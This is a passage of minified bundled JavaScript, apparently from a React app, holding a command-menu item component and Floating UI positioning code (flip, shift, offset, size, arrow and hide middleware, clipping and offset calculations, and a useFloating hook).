  ref: n,
  className: ne("-mx-1 h-px bg-border", e),
  ...t
}));
WE.displayName = De.Separator.displayName;
const xh = c.forwardRef(({
  className: e,
  ...t
}, n) => E.jsx(De.Item, {
  ref: n,
  className: ne("relative flex cursor-default select-none items-center rounded-sm px-2 py-1.5 text-sm outline-none data-[disabled=true]:pointer-events-none data-[selected='true']:bg-accent data-[selected=true]:text-accent-foreground data-[disabled=true]:opacity-50", e),
  ...t
}));
xh.displayName = De.Item.displayName;
const BE = ["top", "right", "bottom", "left"],
  gt = Math.min,
  Le = Math.max,
  pl = Math.round,
  Ei = Math.floor,
  an = e => ({
    x: e,
    y: e
  }),
  VE = {
    left: "right",
    right: "left",
    bottom: "top",
    top: "bottom"
  },
  HE = {
    start: "end",
    end: "start"
  };
function Xa(e, t, n) {
  return Le(e, gt(t, n));
}
function It(e, t) {
  return "function" == typeof e ? e(t) : e;
}
function Mt(e) {
  return e.split("-")[0];
}
function Mr(e) {
  return e.split("-")[1];
}
function gc(e) {
  return "x" === e ? "y" : "x";
}
function yc(e) {
  return "y" === e ? "height" : "width";
}
function un(e) {
  return ["top", "bottom"].includes(Mt(e)) ? "y" : "x";
}
function wc(e) {
  return gc(un(e));
}
function KE(e, t, n) {
  void 0 === n && (n = !1);
  const r = Mr(e),
    o = wc(e),
    i = yc(o);
  let l = "x" === o ? r === (n ? "end" : "start") ? "right" : "left" : "start" === r ? "bottom" : "top";
  return t.reference[i] > t.floating[i] && (l = ml(l)), [l, ml(l)];
}
function GE(e) {
  const t = ml(e);
  return [Za(e), t, Za(t)];
}
function Za(e) {
  return e.replace(/start|end/g, t => HE[t]);
}
function QE(e, t, n) {
  const r = ["left", "right"],
    o = ["right", "left"],
    i = ["top", "bottom"],
    l = ["bottom", "top"];
  switch (e) {
    case "top":
    case "bottom":
      return n ? t ? o : r : t ? r : o;
    case "left":
    case "right":
      return t ? i : l;
    default:
      return [];
  }
}
function YE(e, t, n, r) {
  const o = Mr(e);
  let i = QE(Mt(e), "start" === n, r);
  return o && (i = i.map(l => l + "-" + o), t && (i = i.concat(i.map(Za)))), i;
}
function ml(e) {
  return e.replace(/left|right|bottom|top/g, t => VE[t]);
}
function XE(e) {
  return {
    top: 0,
    right: 0,
    bottom: 0,
    left: 0,
    ...e
  };
}
function Sh(e) {
  return "number" != typeof e ? XE(e) : {
    top: e,
    right: e,
    bottom: e,
    left: e
  };
}
function vl(e) {
  const {
    x: t,
    y: n,
    width: r,
    height: o
  } = e;
  return {
    width: r,
    height: o,
    top: n,
    left: t,
    right: t + r,
    bottom: n + o,
    x: t,
    y: n
  };
}
function Sf(e, t, n) {
  let {
    reference: r,
    floating: o
  } = e;
  const i = un(t),
    l = wc(t),
    s = yc(l),
    a = Mt(t),
    u = "y" === i,
    d = r.x + r.width / 2 - o.width / 2,
    f = r.y + r.height / 2 - o.height / 2,
    v = r[s] / 2 - o[s] / 2;
  let g;
  switch (a) {
    case "top":
      g = {
        x: d,
        y: r.y - o.height
      };
      break;
    case "bottom":
      g = {
        x: d,
        y: r.y + r.height
      };
      break;
    case "right":
      g = {
        x: r.x + r.width,
        y: f
      };
      break;
    case "left":
      g = {
        x: r.x - o.width,
        y: f
      };
      break;
    default:
      g = {
        x: r.x,
        y: r.y
      };
  }
  switch (Mr(t)) {
    case "start":
      g[l] -= v * (n && u ? -1 : 1);
      break;
    case "end":
      g[l] += v * (n && u ? -1 : 1);
  }
  return g;
}
const ZE = async (e, t, n) => {
  const {
      placement: r = "bottom",
      strategy: o = "absolute",
      middleware: i = [],
      platform: l
    } = n,
    s = i.filter(Boolean),
    a = await (null == l.isRTL ? void 0 : l.isRTL(t));
  let u = await l.getElementRects({
      reference: e,
      floating: t,
      strategy: o
    }),
    {
      x: d,
      y: f
    } = Sf(u, r, a),
    v = r,
    g = {},
    x = 0;
  for (let h = 0; h < s.length; h++) {
    const {
        name: w,
        fn: m
      } = s[h],
      {
        x: p,
        y: y,
        data: S,
        reset: C
      } = await m({
        x: d,
        y: f,
        initialPlacement: r,
        placement: v,
        strategy: o,
        middlewareData: g,
        rects: u,
        platform: l,
        elements: {
          reference: e,
          floating: t
        }
      });
    d = p !== null && p !== void 0 ? p : d, f = y !== null && y !== void 0 ? y : f, g = {
      ...g,
      [w]: {
        ...g[w],
        ...S
      }
    }, C && x <= 50 && (x++, "object" == typeof C && (C.placement && (v = C.placement), C.rects && (u = !0 === C.rects ? await l.getElementRects({
      reference: e,
      floating: t,
      strategy: o
    }) : C.rects), ({
      x: d,
      y: f
    } = Sf(u, v, a))), h = -1);
  }
  return {
    x: d,
    y: f,
    placement: v,
    strategy: o,
    middlewareData: g
  };
};
async function Oo(e, t) {
  var n;
  void 0 === t && (t = {});
  const {
      x: r,
      y: o,
      platform: i,
      rects: l,
      elements: s,
      strategy: a
    } = e,
    {
      boundary: u = "clippingAncestors",
      rootBoundary: d = "viewport",
      elementContext: f = "floating",
      altBoundary: v = !1,
      padding: g = 0
    } = It(t, e),
    x = Sh(g),
    w = s[v ? "floating" === f ? "reference" : "floating" : f],
    m = vl(await i.getClippingRect({
      element: null == (n = await (null == i.isElement ? void 0 : i.isElement(w))) || n ? w : w.contextElement || (await (null == i.getDocumentElement ? void 0 : i.getDocumentElement(s.floating))),
      boundary: u,
      rootBoundary: d,
      strategy: a
    })),
    p = "floating" === f ? {
      x: r,
      y: o,
      width: l.floating.width,
      height: l.floating.height
    } : l.reference,
    y = await (null == i.getOffsetParent ? void 0 : i.getOffsetParent(s.floating)),
    S = (await (null == i.isElement ? void 0 : i.isElement(y))) && (await (null == i.getScale ? void 0 : i.getScale(y))) || {
      x: 1,
      y: 1
    },
    C = vl(i.convertOffsetParentRelativeRectToViewportRelativeRect ? await i.convertOffsetParentRelativeRectToViewportRelativeRect({
      elements: s,
      rect: p,
      offsetParent: y,
      strategy: a
    }) : p);
  return {
    top: (m.top - C.top + x.top) / S.y,
    bottom: (C.bottom - m.bottom + x.bottom) / S.y,
    left: (m.left - C.left + x.left) / S.x,
    right: (C.right - m.right + x.right) / S.x
  };
}
const JE = e => ({
    name: "arrow",
    options: e,
    async fn(t) {
      const {
          x: n,
          y: r,
          placement: o,
          rects: i,
          platform: l,
          elements: s,
          middlewareData: a
        } = t,
        {
          element: u,
          padding: d = 0
        } = It(e, t) || {};
      if (null == u) return {};
      const f = Sh(d),
        v = {
          x: n,
          y: r
        },
        g = wc(o),
        x = yc(g),
        h = await l.getDimensions(u),
        w = "y" === g,
        m = w ? "top" : "left",
        p = w ? "bottom" : "right",
        y = w ? "clientHeight" : "clientWidth",
        S = i.reference[x] + i.reference[g] - v[g] - i.floating[x],
        C = v[g] - i.reference[g],
        P = await (null == l.getOffsetParent ? void 0 : l.getOffsetParent(u));
      let k = P ? P[y] : 0;
      (!k || !(await (null == l.isElement ? void 0 : l.isElement(P)))) && (k = s.floating[y] || i.floating[x]);
      const b = S / 2 - C / 2,
        T = k / 2 - h[x] / 2 - 1,
        O = gt(f[m], T),
        U = gt(f[p], T),
        I = O,
        Z = k - h[x] - U,
        H = k / 2 - h[x] / 2 + b,
        Q = Xa(I, H, Z),
        Y = !a.arrow && null != Mr(o) && H !== Q && i.reference[x] / 2 - (H < I ? O : U) - h[x] / 2 < 0,
        z = Y ? H < I ? H - I : H - Z : 0;
      return {
        [g]: v[g] + z,
        data: {
          [g]: Q,
          centerOffset: H - Q - z,
          ...(Y && {
            alignmentOffset: z
          })
        },
        reset: Y
      };
    }
  }),
  qE = function (e) {
    return void 0 === e && (e = {}), {
      name: "flip",
      options: e,
      async fn(t) {
        var n, r;
        const {
            placement: o,
            middlewareData: i,
            rects: l,
            initialPlacement: s,
            platform: a,
            elements: u
          } = t,
          {
            mainAxis: d = !0,
            crossAxis: f = !0,
            fallbackPlacements: v,
            fallbackStrategy: g = "bestFit",
            fallbackAxisSideDirection: x = "none",
            flipAlignment: h = !0,
            ...w
          } = It(e, t);
        if (null != (n = i.arrow) && n.alignmentOffset) return {};
        const m = Mt(o),
          p = un(s),
          y = Mt(s) === s,
          S = await (null == a.isRTL ? void 0 : a.isRTL(u.floating)),
          C = v || (y || !h ? [ml(s)] : GE(s)),
          P = "none" !== x;
        !v && P && C.push(...YE(s, h, x, S));
        const k = [s, ...C],
          b = await Oo(t, w),
          T = [];
        let O = (null == (r = i.flip) ? void 0 : r.overflows) || [];
        if (d && T.push(b[m]), f) {
          const H = KE(o, l, S);
          T.push(b[H[0]], b[H[1]]);
        }
        if (O = [...O, {
          placement: o,
          overflows: T
        }], !T.every(H => H <= 0)) {
          var U, I;
          const H = ((null == (U = i.flip) ? void 0 : U.index) || 0) + 1,
            Q = k[H];
          if (Q) return {
            data: {
              index: H,
              overflows: O
            },
            reset: {
              placement: Q
            }
          };
          let Y = null == (I = O.filter(z => z.overflows[0] <= 0).sort((z, $) => z.overflows[1] - $.overflows[1])[0]) ? void 0 : I.placement;
          if (!Y) switch (g) {
            case "bestFit":
              {
                var Z;
                const z = null == (Z = O.filter($ => {
                  if (P) {
                    const R = un($.placement);
                    return R === p || "y" === R;
                  }
                  return !0;
                }).map($ => [$.placement, $.overflows.filter(R => R > 0).reduce((R, M) => R + M, 0)]).sort(($, R) => $[1] - R[1])[0]) ? void 0 : Z[0];
                z && (Y = z);
                break;
              }
            case "initialPlacement":
              Y = s;
          }
          if (o !== Y) return {
            reset: {
              placement: Y
            }
          };
        }
        return {};
      }
    };
  };
function Ef(e, t) {
  return {
    top: e.top - t.height,
    right: e.right - t.width,
    bottom: e.bottom - t.height,
    left: e.left - t.width
  };
}
function Cf(e) {
  return BE.some(t => e[t] >= 0);
}
const eC = function (e) {
  return void 0 === e && (e = {}), {
    name: "hide",
    options: e,
    async fn(t) {
      const {
          rects: n
        } = t,
        {
          strategy: r = "referenceHidden",
          ...o
        } = It(e, t);
      switch (r) {
        case "referenceHidden":
          {
            const l = Ef(await Oo(t, {
              ...o,
              elementContext: "reference"
            }), n.reference);
            return {
              data: {
                referenceHiddenOffsets: l,
                referenceHidden: Cf(l)
              }
            };
          }
        case "escaped":
          {
            const l = Ef(await Oo(t, {
              ...o,
              altBoundary: !0
            }), n.floating);
            return {
              data: {
                escapedOffsets: l,
                escaped: Cf(l)
              }
            };
          }
        default:
          return {};
      }
    }
  };
};
async function tC(e, t) {
  const {
      placement: n,
      platform: r,
      elements: o
    } = e,
    i = await (null == r.isRTL ? void 0 : r.isRTL(o.floating)),
    l = Mt(n),
    s = Mr(n),
    a = "y" === un(n),
    u = ["left", "top"].includes(l) ? -1 : 1,
    d = i && a ? -1 : 1,
    f = It(t, e);
  let {
    mainAxis: v,
    crossAxis: g,
    alignmentAxis: x
  } = "number" == typeof f ? {
    mainAxis: f,
    crossAxis: 0,
    alignmentAxis: null
  } : {
    mainAxis: 0,
    crossAxis: 0,
    alignmentAxis: null,
    ...f
  };
  return s && "number" == typeof x && (g = "end" === s ? -1 * x : x), a ? {
    x: g * d,
    y: v * u
  } : {
    x: v * u,
    y: g * d
  };
}
const nC = function (e) {
    return void 0 === e && (e = 0), {
      name: "offset",
      options: e,
      async fn(t) {
        var n, r;
        const {
            x: o,
            y: i,
            placement: l,
            middlewareData: s
          } = t,
          a = await tC(t, e);
        return l === (null == (n = s.offset) ? void 0 : n.placement) && null != (r = s.arrow) && r.alignmentOffset ? {} : {
          x: o + a.x,
          y: i + a.y,
          data: {
            ...a,
            placement: l
          }
        };
      }
    };
  },
  rC = function (e) {
    return void 0 === e && (e = {}), {
      name: "shift",
      options: e,
      async fn(t) {
        const {
            x: n,
            y: r,
            placement: o
          } = t,
          {
            mainAxis: i = !0,
            crossAxis: l = !1,
            limiter: s = {
              fn: w => {
                let {
                  x: m,
                  y: p
                } = w;
                return {
                  x: m,
                  y: p
                };
              }
            },
            ...a
          } = It(e, t),
          u = {
            x: n,
            y: r
          },
          d = await Oo(t, a),
          f = un(Mt(o)),
          v = gc(f);
        let g = u[v],
          x = u[f];
        if (i) {
          const m = "y" === v ? "bottom" : "right";
          g = Xa(g + d["y" === v ? "top" : "left"], g, g - d[m]);
        }
        if (l) {
          const m = "y" === f ? "bottom" : "right";
          x = Xa(x + d["y" === f ? "top" : "left"], x, x - d[m]);
        }
        const h = s.fn({
          ...t,
          [v]: g,
          [f]: x
        });
        return {
          ...h,
          data: {
            x: h.x - n,
            y: h.y - r
          }
        };
      }
    };
  },
  oC = function (e) {
    return void 0 === e && (e = {}), {
      options: e,
      fn(t) {
        const {
            x: n,
            y: r,
            placement: o,
            rects: i,
            middlewareData: l
          } = t,
          {
            offset: s = 0,
            mainAxis: a = !0,
            crossAxis: u = !0
          } = It(e, t),
          d = {
            x: n,
            y: r
          },
          f = un(o),
          v = gc(f);
        let g = d[v],
          x = d[f];
        const h = It(s, t),
          w = "number" == typeof h ? {
            mainAxis: h,
            crossAxis: 0
          } : {
            mainAxis: 0,
            crossAxis: 0,
            ...h
          };
        if (a) {
          const y = "y" === v ? "height" : "width",
            S = i.reference[v] - i.floating[y] + w.mainAxis,
            C = i.reference[v] + i.reference[y] - w.mainAxis;
          g < S ? g = S : g > C && (g = C);
        }
        if (u) {
          var m, p;
          const y = "y" === v ? "width" : "height",
            S = ["top", "left"].includes(Mt(o)),
            C = i.reference[f] - i.floating[y] + (S && (null == (m = l.offset) ? void 0 : m[f]) || 0) + (S ? 0 : w.crossAxis),
            P = i.reference[f] + i.reference[y] + (S ? 0 : (null == (p = l.offset) ? void 0 : p[f]) || 0) - (S ? w.crossAxis : 0);
          x < C ? x = C : x > P && (x = P);
        }
        return {
          [v]: g,
          [f]: x
        };
      }
    };
  },
  iC = function (e) {
    return void 0 === e && (e = {}), {
      name: "size",
      options: e,
      async fn(t) {
        const {
            placement: n,
            rects: r,
            platform: o,
            elements: i
          } = t,
          {
            apply: l = () => {},
            ...s
          } = It(e, t),
          a = await Oo(t, s),
          u = Mt(n),
          d = Mr(n),
          f = "y" === un(n),
          {
            width: v,
            height: g
          } = r.floating;
        let x, h;
        "top" === u || "bottom" === u ? (x = u, h = d === ((await (null == o.isRTL ? void 0 : o.isRTL(i.floating))) ? "start" : "end") ? "left" : "right") : (h = u, x = "end" === d ? "top" : "bottom");
        const w = g - a.top - a.bottom,
          m = v - a.left - a.right,
          p = gt(g - a[x], w),
          y = gt(v - a[h], m),
          S = !t.middlewareData.shift;
        let C = p,
          P = y;
        if (f ? P = d || S ? gt(y, m) : m : C = d || S ? gt(p, w) : w, S && !d) {
          const b = Le(a.left, 0),
            T = Le(a.right, 0),
            O = Le(a.top, 0),
            U = Le(a.bottom, 0);
          f ? P = v - 2 * (0 !== b || 0 !== T ? b + T : Le(a.left, a.right)) : C = g - 2 * (0 !== O || 0 !== U ? O + U : Le(a.top, a.bottom));
        }
        await l({
          ...t,
          availableWidth: P,
          availableHeight: C
        });
        const k = await o.getDimensions(i.floating);
        return v !== k.width || g !== k.height ? {
          reset: {
            rects: !0
          }
        } : {};
      }
    };
  };
function Lr(e) {
  return Eh(e) ? (e.nodeName || "").toLowerCase() : "#document";
}
function We(e) {
  var t;
  return (null == e || null == (t = e.ownerDocument) ? void 0 : t.defaultView) || window;
}
function jt(e) {
  var t;
  return null == (t = (Eh(e) ? e.ownerDocument : e.document) || window.document) ? void 0 : t.documentElement;
}
function Eh(e) {
  return e instanceof Node || e instanceof We(e).Node;
}
function ut(e) {
  return e instanceof Element || e instanceof We(e).Element;
}
function xt(e) {
  return e instanceof HTMLElement || e instanceof We(e).HTMLElement;
}
function kf(e) {
  return !(typeof ShadowRoot > "u") && (e instanceof ShadowRoot || e instanceof We(e).ShadowRoot);
}
function Ko(e) {
  const {
    overflow: t,
    overflowX: n,
    overflowY: r,
    display: o
  } = ct(e);
  return /auto|scroll|overlay|hidden|clip/.test(t + r + n) && !["inline", "contents"].includes(o);
}
function lC(e) {
  return ["table", "td", "th"].includes(Lr(e));
}
function Bl(e) {
  return [":popover-open", ":modal"].some(t => {
    try {
      return e.matches(t);
    } catch {
      return !1;
    }
  });
}
function xc(e) {
  const t = Sc(),
    n = ut(e) ? ct(e) : e;
  return "none" !== n.transform || "none" !== n.perspective || !!n.containerType && "normal" !== n.containerType || !t && !!n.backdropFilter && "none" !== n.backdropFilter || !t && !!n.filter && "none" !== n.filter || ["transform", "perspective", "filter"].some(r => (n.willChange || "").includes(r)) || ["paint", "layout", "strict", "content"].some(r => (n.contain || "").includes(r));
}
function sC(e) {
  let t = cn(e);
  for (; xt(t) && !_r(t);) {
    if (xc(t)) return t;
    if (Bl(t)) return null;
    t = cn(t);
  }
  return null;
}
function Sc() {
  return !(typeof CSS > "u" || !CSS.supports) && CSS.supports("-webkit-backdrop-filter", "none");
}
function _r(e) {
  return ["html", "body", "#document"].includes(Lr(e));
}
function ct(e) {
  return We(e).getComputedStyle(e);
}
function Vl(e) {
  return ut(e) ? {
    scrollLeft: e.scrollLeft,
    scrollTop: e.scrollTop
  } : {
    scrollLeft: e.scrollX,
    scrollTop: e.scrollY
  };
}
function cn(e) {
  if ("html" === Lr(e)) return e;
  const t = e.assignedSlot || e.parentNode || kf(e) && e.host || jt(e);
  return kf(t) ? t.host : t;
}
function Ch(e) {
  const t = cn(e);
  return _r(t) ? e.ownerDocument ? e.ownerDocument.body : e.body : xt(t) && Ko(t) ? t : Ch(t);
}
function Ao(e, t, n) {
  var r;
  void 0 === t && (t = []), void 0 === n && (n = !0);
  const o = Ch(e),
    i = o === (null == (r = e.ownerDocument) ? void 0 : r.body),
    l = We(o);
  if (i) {
    const s = Ja(l);
    return t.concat(l, l.visualViewport || [], Ko(o) ? o : [], s && n ? Ao(s) : []);
  }
  return t.concat(o, Ao(o, [], n));
}
function Ja(e) {
  return e.parent && Object.getPrototypeOf(e.parent) ? e.frameElement : null;
}
function kh(e) {
  const t = ct(e);
  let n = parseFloat(t.width) || 0,
    r = parseFloat(t.height) || 0;
  const o = xt(e),
    i = o ? e.offsetWidth : n,
    l = o ? e.offsetHeight : r,
    s = pl(n) !== i || pl(r) !== l;
  return s && (n = i, r = l), {
    width: n,
    height: r,
    $: s
  };
}
function Ec(e) {
  return ut(e) ? e : e.contextElement;
}
function yr(e) {
  const t = Ec(e);
  if (!xt(t)) return an(1);
  const n = t.getBoundingClientRect(),
    {
      width: r,
      height: o,
      $: i
    } = kh(t);
  let l = (i ? pl(n.width) : n.width) / r,
    s = (i ? pl(n.height) : n.height) / o;
  return (!l || !Number.isFinite(l)) && (l = 1), (!s || !Number.isFinite(s)) && (s = 1), {
    x: l,
    y: s
  };
}
const aC = an(0);
function Ph(e) {
  const t = We(e);
  return Sc() && t.visualViewport ? {
    x: t.visualViewport.offsetLeft,
    y: t.visualViewport.offsetTop
  } : aC;
}
function uC(e, t, n) {
  return void 0 === t && (t = !1), !(!n || t && n !== We(e)) && t;
}
function Mn(e, t, n, r) {
  void 0 === t && (t = !1), void 0 === n && (n = !1);
  const o = e.getBoundingClientRect(),
    i = Ec(e);
  let l = an(1);
  t && (r ? ut(r) && (l = yr(r)) : l = yr(e));
  const s = uC(i, n, r) ? Ph(i) : an(0);
  let a = (o.left + s.x) / l.x,
    u = (o.top + s.y) / l.y,
    d = o.width / l.x,
    f = o.height / l.y;
  if (i) {
    const v = We(i),
      g = r && ut(r) ? We(r) : r;
    let x = v,
      h = Ja(x);
    for (; h && r && g !== x;) {
      const w = yr(h),
        m = h.getBoundingClientRect(),
        p = ct(h),
        y = m.left + (h.clientLeft + parseFloat(p.paddingLeft)) * w.x,
        S = m.top + (h.clientTop + parseFloat(p.paddingTop)) * w.y;
      a *= w.x, u *= w.y, d *= w.x, f *= w.y, a += y, u += S, x = We(h), h = Ja(x);
    }
  }
  return vl({
    width: d,
    height: f,
    x: a,
    y: u
  });
}
function cC(e) {
  let {
    elements: t,
    rect: n,
    offsetParent: r,
    strategy: o
  } = e;
  const i = "fixed" === o,
    l = jt(r),
    s = !!t && Bl(t.floating);
  if (r === l || s && i) return n;
  let a = {
      scrollLeft: 0,
      scrollTop: 0
    },
    u = an(1);
  const d = an(0),
    f = xt(r);
  if ((f || !f && !i) && (("body" !== Lr(r) || Ko(l)) && (a = Vl(r)), xt(r))) {
    const v = Mn(r);
    u = yr(r), d.x = v.x + r.clientLeft, d.y = v.y + r.clientTop;
  }
  return {
    width: n.width * u.x,
    height: n.height * u.y,
    x: n.x * u.x - a.scrollLeft * u.x + d.x,
    y: n.y * u.y - a.scrollTop * u.y + d.y
  };
}
function dC(e) {
  return Array.from(e.getClientRects());
}
function _h(e) {
  return Mn(jt(e)).left + Vl(e).scrollLeft;
}
function fC(e) {
  const t = jt(e),
    n = Vl(e),
    r = e.ownerDocument.body,
    o = Le(t.scrollWidth, t.clientWidth, r.scrollWidth, r.clientWidth),
    i = Le(t.scrollHeight, t.clientHeight, r.scrollHeight, r.clientHeight);
  let l = -n.scrollLeft + _h(e);
  const s = -n.scrollTop;
  return "rtl" === ct(r).direction && (l += Le(t.clientWidth, r.clientWidth) - o), {
    width: o,
    height: i,
    x: l,
    y: s
  };
}
function pC(e, t) {
  const n = We(e),
    r = jt(e),
    o = n.visualViewport;
  let i = r.clientWidth,
    l = r.clientHeight,
    s = 0,
    a = 0;
  if (o) {
    i = o.width, l = o.height;
    const u = Sc();
    (!u || u && "fixed" === t) && (s = o.offsetLeft, a = o.offsetTop);
  }
  return {
    width: i,
    height: l,
    x: s,
    y: a
  };
}
function mC(e, t) {
  const n = Mn(e, !0, "fixed" === t),
    r = n.top + e.clientTop,
    o = n.left + e.clientLeft,
    i = xt(e) ? yr(e) : an(1);
  return {
    width: e.clientWidth * i.x,
    height: e.clientHeight * i.y,
    x: o * i.x,
    y: r * i.y
  };
}
function Pf(e, t, n) {
  let r;
  if ("viewport" === t) r = pC(e, n);else if ("document" === t) r = fC(jt(e));else if (ut(t)) r = mC(t, n);else {
    const o = Ph(e);
    r = {
      ...t,
      x: t.x - o.x,
      y: t.y - o.y
    };
  }
  return vl(r);
}
function bh(e, t) {
  const n = cn(e);
  return !(n === t || !ut(n) || _r(n)) && ("fixed" === ct(n).position || bh(n, t));
}
function vC(e, t) {
  const n = t.get(e);
  if (n) return n;
  let r = Ao(e, [], !1).filter(s => ut(s) && "body" !== Lr(s)),
    o = null;
  const i = "fixed" === ct(e).position;
  let l = i ? cn(e) : e;
  for (; ut(l) && !_r(l);) {
    const s = ct(l),
      a = xc(l);
    !a && "fixed" === s.position && (o = null), (i ? !a && !o : !a && "static" === s.position && o && ["absolute", "fixed"].includes(o.position) || Ko(l) && !a && bh(e, l)) ? r = r.filter(d => d !== l) : o = s, l = cn(l);
  }
  return t.set(e, r), r;
}
function hC(e) {
  let {
    element: t,
    boundary: n,
    rootBoundary: r,
    strategy: o
  } = e;
  const l = [...("clippingAncestors" === n ? Bl(t) ? [] : vC(t, this._c) : [].concat(n)), r],
    s = l[0],
    a = l.reduce((u, d) => {
      const f = Pf(t, d, o);
      return u.top = Le(f.top, u.top), u.right = gt(f.right, u.right), u.bottom = gt(f.bottom, u.bottom), u.left = Le(f.left, u.left), u;
    }, Pf(t, s, o));
  return {
    width: a.right - a.left,
    height: a.bottom - a.top,
    x: a.left,
    y: a.top
  };
}
function gC(e) {
  const {
    width: t,
    height: n
  } = kh(e);
  return {
    width: t,
    height: n
  };
}
function yC(e, t, n) {
  const r = xt(t),
    o = jt(t),
    i = "fixed" === n,
    l = Mn(e, !0, i, t);
  let s = {
    scrollLeft: 0,
    scrollTop: 0
  };
  const a = an(0);
  if (r || !r && !i) if (("body" !== Lr(t) || Ko(o)) && (s = Vl(t)), r) {
    const f = Mn(t, !0, i, t);
    a.x = f.x + t.clientLeft, a.y = f.y + t.clientTop;
  } else o && (a.x = _h(o));
  return {
    x: l.left + s.scrollLeft - a.x,
    y: l.top + s.scrollTop - a.y,
    width: l.width,
    height: l.height
  };
}
function Ls(e) {
  return "static" === ct(e).position;
}
function _f(e, t) {
  return xt(e) && "fixed" !== ct(e).position ? t ? t(e) : e.offsetParent : null;
}
function Nh(e, t) {
  const n = We(e);
  if (Bl(e)) return n;
  if (!xt(e)) {
    let o = cn(e);
    for (; o && !_r(o);) {
      if (ut(o) && !Ls(o)) return o;
      o = cn(o);
    }
    return n;
  }
  let r = _f(e, t);
  for (; r && lC(r) && Ls(r);) r = _f(r, t);
  return r && _r(r) && Ls(r) && !xc(r) ? n : r || sC(e) || n;
}
const wC = async function (e) {
  const t = this.getOffsetParent || Nh,
    n = this.getDimensions,
    r = await n(e.floating);
  return {
    reference: yC(e.reference, await t(e.floating), e.strategy),
    floating: {
      x: 0,
      y: 0,
      width: r.width,
      height: r.height
    }
  };
};
function xC(e) {
  return "rtl" === ct(e).direction;
}
const SC = {
  convertOffsetParentRelativeRectToViewportRelativeRect: cC,
  getDocumentElement: jt,
  getClippingRect: hC,
  getOffsetParent: Nh,
  getElementRects: wC,
  getClientRects: dC,
  getDimensions: gC,
  getScale: yr,
  isElement: ut,
  isRTL: xC
};
function EC(e, t) {
  let r,
    n = null;
  const o = jt(e);
  function i() {
    var s;
    clearTimeout(r), null == (s = n) || s.disconnect(), n = null;
  }
  return function l(s, a) {
    void 0 === s && (s = !1), void 0 === a && (a = 1), i();
    const {
      left: u,
      top: d,
      width: f,
      height: v
    } = e.getBoundingClientRect();
    if (s || t(), !f || !v) return;
    const p = {
      rootMargin: -Ei(d) + "px " + -Ei(o.clientWidth - (u + f)) + "px " + -Ei(o.clientHeight - (d + v)) + "px " + -Ei(u) + "px",
      threshold: Le(0, gt(1, a)) || 1
    };
    let y = !0;
    function S(C) {
      const P = C[0].intersectionRatio;
      if (P !== a) {
        if (!y) return l();
        P ? l(!1, P) : r = setTimeout(() => {
          l(!1, 1e-7);
        }, 1e3);
      }
      y = !1;
    }
    try {
      n = new IntersectionObserver(S, {
        ...p,
        root: o.ownerDocument
      });
    } catch {
      n = new IntersectionObserver(S, p);
    }
    n.observe(e);
  }(!0), i;
}
function CC(e, t, n, r) {
  void 0 === r && (r = {});
  const {
      ancestorScroll: o = !0,
      ancestorResize: i = !0,
      elementResize: l = "function" == typeof ResizeObserver,
      layoutShift: s = "function" == typeof IntersectionObserver,
      animationFrame: a = !1
    } = r,
    u = Ec(e),
    d = o || i ? [...(u ? Ao(u) : []), ...Ao(t)] : [];
  d.forEach(m => {
    o && m.addEventListener("scroll", n, {
      passive: !0
    }), i && m.addEventListener("resize", n);
  });
  const f = u && s ? EC(u, n) : null;
  let v = -1,
    g = null;
  l && (g = new ResizeObserver(m => {
    let [p] = m;
    p && p.target === u && g && (g.unobserve(t), cancelAnimationFrame(v), v = requestAnimationFrame(() => {
      var y;
      null == (y = g) || y.observe(t);
    })), n();
  }), u && !a && g.observe(u), g.observe(t));
  let x,
    h = a ? Mn(e) : null;
  return a && function w() {
    const m = Mn(e);
    h && (m.x !== h.x || m.y !== h.y || m.width !== h.width || m.height !== h.height) && n(), h = m, x = requestAnimationFrame(w);
  }(), n(), () => {
    var m;
    d.forEach(p => {
      o && p.removeEventListener("scroll", n), i && p.removeEventListener("resize", n);
    }), null == f || f(), null == (m = g) || m.disconnect(), g = null, a && cancelAnimationFrame(x);
  };
}
const kC = nC,
  PC = rC,
  _C = qE,
  bC = iC,
  NC = eC,
  bf = JE,
  $C = oC,
  RC = (e, t, n) => {
    const r = new Map(),
      o = {
        platform: SC,
        ...n
      },
      i = {
        ...o.platform,
        _c: r
      };
    return ZE(e, t, {
      ...o,
      platform: i
    });
  };
var zi = typeof document < "u" ? c.useLayoutEffect : c.useEffect;
function hl(e, t) {
  if (e === t) return !0;
  if (typeof e != typeof t) return !1;
  if ("function" == typeof e && e.toString() === t.toString()) return !0;
  let n, r, o;
  if (e && t && "object" == typeof e) {
    if (Array.isArray(e)) {
      if (n = e.length, n !== t.length) return !1;
      for (r = n; 0 != r--;) if (!hl(e[r], t[r])) return !1;
      return !0;
    }
    if (o = Object.keys(e), n = o.length, n !== Object.keys(t).length) return !1;
    for (r = n; 0 != r--;) if (!{}.hasOwnProperty.call(t, o[r])) return !1;
    for (r = n; 0 != r--;) {
      const i = o[r];
      if (!("_owner" === i && e.$$typeof || hl(e[i], t[i]))) return !1;
    }
    return !0;
  }
  return e != e && t != t;
}
function $h(e) {
  return typeof window > "u" ? 1 : (e.ownerDocument.defaultView || window).devicePixelRatio || 1;
}
function Nf(e, t) {
  const n = $h(e);
  return Math.round(t * n) / n;
}
function $f(e) {
  const t = c.useRef(e);
  return zi(() => {
    t.current = e;
  }), t;
}
function OC(e) {
  void 0 === e && (e = {});
  const {
      placement: t = "bottom",
      strategy: n = "absolute",
      middleware: r = [],
      platform: o,
      elements: {
        reference: i,
        floating: l
      } = {},
      transform: s = !0,
      whileElementsMounted: a,
      open: u
    } = e,
    [d, f] = c.useState({
      x: 0,
      y: 0,
      strategy: n,
      placement: t,
      middlewareData: {},
      isPositioned: !1
    }),
    [v, g] = c.useState(r);
  hl(v, r) || g(r);
  const [x, h] = c.useState(null),
    [w, m] = c.useState(null),
    p = c.useCallback(z => {
      z !== P.current && (P.current = z, h(z));
    }, []),
    y = c.useCallback(z => {
      z !== k.current && (k.current = z, m(z));
    }, []),
    S = i || x,
    C = l || w,
    P = c.useRef(null),
    k = c.useRef(null),
    b = c.useRef(d),
    T = null != a,
    O = $f(a),
    U = $f(o),
    I = c.useCallback(() => {
      if (!P.current || !k.current) return;
      const z = {
        placement: t,
        strategy: n,
        middleware: v
      };
      U.current && (z.platform = U.current), RC(P.current, k.current, z).then($ => {
        const R = {
          ...$,
          isPositioned: !0
        };
        Z.current && !hl(b.current, R) && (b.current = R, Un.flushSync(() => {
          f(R);
        }));
      });
    }, [v, t, n, U]);
  zi(() => {
    !1 === u && b.current.isPositioned && (b.current.isPositioned = !1, f(z => ({
      ...z,
      isPositioned: !1
    })));
